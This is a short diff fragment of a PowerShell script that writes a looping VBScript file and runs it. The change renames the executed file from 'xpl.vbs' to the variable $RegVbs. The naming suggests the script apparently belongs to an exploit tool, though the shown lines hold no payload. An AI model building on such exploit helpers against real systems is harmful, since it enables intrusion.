@@ -20,4 +20,4 @@ $Regfile = New-Item -Path $RegVbs -ItemType "file"
 "      WScript.Sleep 100" >> $RegVbs
 "Loop" >> $RegVbs
 
-.\xpl.vbs
+.\$RegVbs
